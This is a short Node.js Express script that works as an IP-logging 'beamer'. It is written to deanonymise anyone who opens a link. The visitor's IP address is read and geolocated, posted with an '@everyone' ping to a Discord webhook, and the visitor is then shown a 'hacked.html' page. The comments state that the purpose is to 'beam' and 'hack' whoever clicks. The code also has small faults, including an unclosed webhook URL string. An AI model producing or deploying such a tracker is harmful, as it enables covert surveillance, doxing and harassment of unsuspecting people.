const express = require('express');
const geoip = require('geoip-lite');
const axios = require('axios');
const app = express();
const port = 3000;





app.get('/', (req, res) => {
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress; // get the ip address of the user who clicks on it
  const geo = geoip.lookup(ip); // look up the ip address of the person who clicked on it

  const location = {
    country:geo.country,
    region: geo.region,
    city: geo.city,
    ll: geo.ll
  };

  const message = `  @everyone,Beamed IP Address: ${ip}\nBeamed location: ${JSON.stringify(location)}`; // notifiy everyone of the new beam
  console.log(message); // log the message

  axios.post('Your webhook url, {
    content: message
  })
  .then(response => {
    console.log('Message sent to Discord webhook');
  })
  .catch(error => {
    console.error('Error sending message to Discord webhook', error);
  });

  res.sendFile("hacked.html") // render a file to ensure the user who clicked on it got hacked
});

app.listen(port, () => {
  console.log(`Server started on port ${port}`);
});
